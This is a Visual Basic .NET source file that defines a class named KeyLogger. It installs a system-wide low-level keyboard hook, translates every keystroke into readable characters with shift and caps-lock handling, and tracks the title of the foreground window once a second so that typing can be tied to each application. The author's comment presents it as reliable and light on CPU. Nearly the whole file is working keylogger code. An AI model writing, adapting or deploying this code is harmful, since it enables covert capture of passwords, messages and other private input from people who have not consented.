Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Text
Imports Microsoft.Win32
Imports System.ComponentModel


' My own Keyhook class, very reliable, - eventbased and not using much CPU


Friend Module API

    <DllImport("user32.dll")> _
    Public Function GetForegroundWindow() As IntPtr
    End Function

    <DllImport("user32.dll")> _
    Public Function GetWindowText(ByVal hWnd As IntPtr, ByVal text As StringBuilder, ByVal Count As Integer) As Integer
    End Function

End Module

Public Delegate Sub KeyLoggerEventArgsEventHandler(ByVal sender As Object, ByVal e As KeyLoggerEventArgs)




Public Class KeyLoggerEventArgs
    Inherits EventArgs

    Private _keys As Keys
    Private _stringValue As String

    Public Sub New(ByVal key As Keys, ByVal stringValue As String)
        _keys = key
        _stringValue = stringValue
    End Sub

    Public ReadOnly Property Key As Keys
        Get
            Return _keys
        End Get
    End Property


    Public ReadOnly Property StringValue As String
        Get
            Return _stringValue
        End Get
    End Property

End Class

Public Class KeyLogger
    Implements IDisposable

    Private Declare Function SetHook Lib "user32" Alias "SetWindowsHookExA" (ByVal hook As Integer, ByVal KeyDelegate As KeyboardProc, ByVal HMod As IntPtr, ByVal ThreadId As Integer) As IntPtr
    Private Declare Function CallNextHook Lib "user32" Alias "CallNextHookEx" (ByVal hook As IntPtr, ByVal code As Integer, ByVal direction As Integer, ByRef key As Keys) As Integer
    Private Declare Function UnHook Lib "user32" Alias "UnhookWindowsHookEx" (ByVal hook As IntPtr) As Integer

    Private Delegate Function KeyboardProc(ByVal code As Integer, ByVal direction As Integer, ByRef key As Keys) As Integer

    Private _hookCallback As New KeyboardProc(AddressOf ProcessKey)
    Private _hook As IntPtr
    Private _currentWindow As String
    Private _newWindow As Boolean

    Public Event KeyDown As KeyLoggerEventArgsEventHandler
    Public Event KeyUp As KeyLoggerEventArgsEventHandler

    Public ReadOnly Property CurrentWindow As String
        Get
            Return _currentWindow
        End Get
    End Property

    Public Sub New()
        _hook = SetHook(13, _hookCallback, IntPtr.Zero, 0)

        If _hook = IntPtr.Zero Then
            Throw New Win32Exception(Marshal.GetLastWin32Error())
        End If

        InitializeCaptionLogging()
    End Sub

    Private Function ProcessKey(ByVal code As Integer, ByVal direction As Integer, ByRef key As Keys) As Integer
        If code = 0 Then
            If direction = &H100 Then
                RaiseEvent KeyDown(Me, New KeyLoggerEventArgs(key, Identifykey(key)))
            ElseIf direction = &H104 Then
                RaiseEvent KeyUp(Me, New KeyLoggerEventArgs(key, Identifykey(key)))
            End If
        End If
        Return CallNextHook(_hook, code, direction, key)
    End Function

    Private Function Identifykey(ByVal key As Keys) As String
        Dim caps As Boolean = My.Computer.Keyboard.CapsLock Or My.Computer.Keyboard.ShiftKeyDown
        Dim shift As Boolean = My.Computer.Keyboard.ShiftKeyDown
        Select Case True
            Case key = (3) : Return "<Cancel>"
            Case key = (8) : Return "<BS>"
            Case key = (9) : Return "<Tab>"
            Case key = (10) : Return "<Lf>"
            Case key = (13) : Return "<Enter>"
            Case key = (17) Or key = (162) Or key = (163) : Return "<CTRL>"
            Case key = (18) Or key = (164) Or key = (165) : Return "<ALT>"
            Case key = (19) : Return "<Pause/Break>"
            Case key = (20) : Return "<CapsL>"
            Case key = (27) : Return "<Esc>"
            Case key = (32) : Return " "
            Case key = (33) : Return "<PageUp>"
            Case key = (34) : Return "<PageDown>"
            Case key = (35) : Return "<End>"
            Case key = (36) : Return "<Home>"
            Case key = (37) : Return "<LArrow>"
            Case key = (38) : Return "<UArrow>"
            Case key = (39) : Return "<RArrow>"
            Case key = (40) : Return "<DArrow>"
            Case key = (41) : Return "<Select>"
            Case key = (42) : Return "<Print>"
            Case key = (44) : Return "<PrintScreen>"
            Case key = (45) : Return "<Insert>"
            Case key = (46) : Return "<Delete>"
            Case key = (48) And shift : Return ")"
            Case key = (48) : Return "0"
            Case key = (49) And shift : Return "!"
            Case key = (49) : Return "1"
            Case key = (50) And shift : Return "@"
            Case key = (50) : Return "2"
            Case key = (51) And shift : Return "#"
            Case key = (51) : Return "3"
            Case key = (52) And shift : Return "$"
            Case key = (52) : Return "4"
            Case key = (53) And shift : Return "%"
            Case key = (53) : Return "5"
            Case key = (54) And shift : Return "^"
            Case key = (54) : Return "6"
            Case key = (55) And shift : Return "&"
            Case key = (55) : Return "7"
            Case key = (56) And shift : Return "*"
            Case key = (56) : Return "8"
            Case key = (57) And shift : Return "("
            Case key = (57) : Return "9"
            Case key = (65) And caps : Return "A"
            Case key = (65) : Return "a"
            Case key = (66) And caps : Return "B"
            Case key = (66) : Return "b"
            Case key = (67) And caps : Return "C"
            Case key = (67) : Return "c"
            Case key = (68) And caps : Return "D"
            Case key = (68) : Return "d"
            Case key = (69) And caps : Return "E"
            Case key = (69) : Return "e"
            Case key = (70) And caps : Return "F"
            Case key = (70) : Return "f"
            Case key = (71) And caps : Return "G"
            Case key = (71) : Return "g"
            Case key = (72) And caps : Return "H"
            Case key = (72) : Return "h"
            Case key = (73) And caps : Return "I"
            Case key = (73) : Return "i"
            Case key = (74) And caps : Return "J"
            Case key = (74) : Return "j"
            Case key = (75) And caps : Return "K"
            Case key = (75) : Return "k"
            Case key = (76) And caps : Return "L"
            Case key = (76) : Return "l"
            Case key = (77) And caps : Return "M"
            Case key = (77) : Return "m"
            Case key = (78) And caps : Return "N"
            Case key = (78) : Return "n"
            Case key = (79) And caps : Return "O"
            Case key = (79) : Return "o"
            Case key = (80) And caps : Return "P"
            Case key = (80) : Return "p"
            Case key = (81) And caps : Return "Q"
            Case key = (81) : Return "q"
            Case key = (82) And caps : Return "R"
            Case key = (82) : Return "r"
            Case key = (83) And caps : Return "S"
            Case key = (83) : Return "s"
            Case key = (84) And caps : Return "T"
            Case key = (84) : Return "t"
            Case key = (85) And caps : Return "U"
            Case key = (85) : Return "u"
            Case key = (86) And caps : Return "V"
            Case key = (86) : Return "v"
            Case key = (87) And caps : Return "W"
            Case key = (87) : Return "w"
            Case key = (88) And caps : Return "X"
            Case key = (88) : Return "x"
            Case key = (89) And caps : Return "Y"
            Case key = (89) : Return "y"
            Case key = (90) And caps : Return "Z"
            Case key = (90) : Return "z"
            Case key = (91) Or key = (92) : Return "<Winkey>"
            Case key = (93) : Return "<RightClick>"
            Case key = (96) : Return "0"
            Case key = (97) : Return "1"
            Case key = (98) : Return "2"
            Case key = (99) : Return "3"
            Case key = (100) : Return "4"
            Case key = (101) : Return "5"
            Case key = (102) : Return "6"
            Case key = (103) : Return "7"
            Case key = (104) : Return "8"
            Case key = (105) : Return "9"
            Case key = (106) : Return "*"
            Case key = (107) : Return "+"
            Case key = (108) : Return "<Separator>"
            Case key = (109) : Return "-"
            Case key = (110) : Return "."
            Case key = (111) : Return "/"
            Case key = (112) : Return "<F1>"
            Case key = (113) : Return "<F2>"
            Case key = (114) : Return "<F3>"
            Case key = (115) : Return "<F4>"
            Case key = (116) : Return "<F5>"
            Case key = (117) : Return "<F6>"
            Case key = (118) : Return "<F7>"
            Case key = (119) : Return "<F8>"
            Case key = (120) : Return "<F9>"
            Case key = (121) : Return "<F10>"
            Case key = (122) : Return "<F11>"
            Case key = (123) : Return "<F12>"
            Case key = (144) : Return "<NumL>"
            Case key = (145) : Return "<ScrollL>"
            Case key = (166) : Return "<BrowserBack>"
            Case key = (167) : Return "<BrowserForward>"
            Case key = (168) : Return "<BrowserRefresh>"
            Case key = (169) : Return "<BrowserStop>"
            Case key = (170) : Return "<BrowserSearch>"
            Case key = (171) : Return "<BrowserFavorites>"
            Case key = (172) : Return "<BrowserHome>"
            Case key = (173) : Return "<Mute>"
            Case key = (174) : Return "<Volume->"
            Case key = (175) : Return "<Volume+>"
            Case key = (176) : Return "<Forward>"
            Case key = (177) : Return "<Backward>"
            Case key = (178) : Return "<Stop>"
            Case key = (179) : Return "<Play>"
            Case key = (180) : Return "<Mail>"
            Case key = (181) : Return "<Media>"
            Case key = (182) : Return "<App1>"
            Case key = (183) : Return "<App2>"
            Case key = (186) And shift : Return ":"
            Case key = (186) : Return ";"
            Case key = (187) And shift : Return "+"
            Case key = (187) : Return "="
            Case key = (188) And shift : Return "<"
            Case key = (188) : Return ","
            Case key = (189) And shift : Return "_"
            Case key = (189) : Return "-"
            Case key = (190) And shift : Return ">"
            Case key = (190) : Return "."
            Case key = (191) And shift : Return "?"
            Case key = (191) : Return "/"
            Case key = (192) And shift : Return "~"
            Case key = (192) : Return "`"
            Case key = (219) And shift : Return "{"
            Case key = (219) : Return "["
            Case key = (220) And shift : Return "|"
            Case key = (220) : Return "\"
            Case key = (221) And shift : Return "}"
            Case key = (221) : Return "]"
            Case key = (222) And shift : Return """"
            Case key = (222) : Return "'"
            Case key = (251) : Return "<Zoom>"
            Case key = (252) : Return "<Other>"
            Case key = (255) : Return "<Other>"
        End Select
        Return String.Empty
    End Function

    Private Sub InitializeCaptionLogging()
        Dim t As New Thread(Sub()
                                Do
                                    Dim buffer As New StringBuilder(256)
                                    If GetWindowText(GetForegroundWindow(), buffer, 256) > 0 Then
                                        If buffer.ToString <> _currentWindow Then
                                            _currentWindow = buffer.ToString
                                        End If
                                    End If
                                    Thread.Sleep(1000)
                                Loop
                            End Sub)
        t.Start()
    End Sub

#Region "IDisposable Support"
    Public Sub Dispose() Implements IDisposable.Dispose
        UnHook(_hook)
        GC.SuppressFinalize(Me)
    End Sub
#End Region

End Class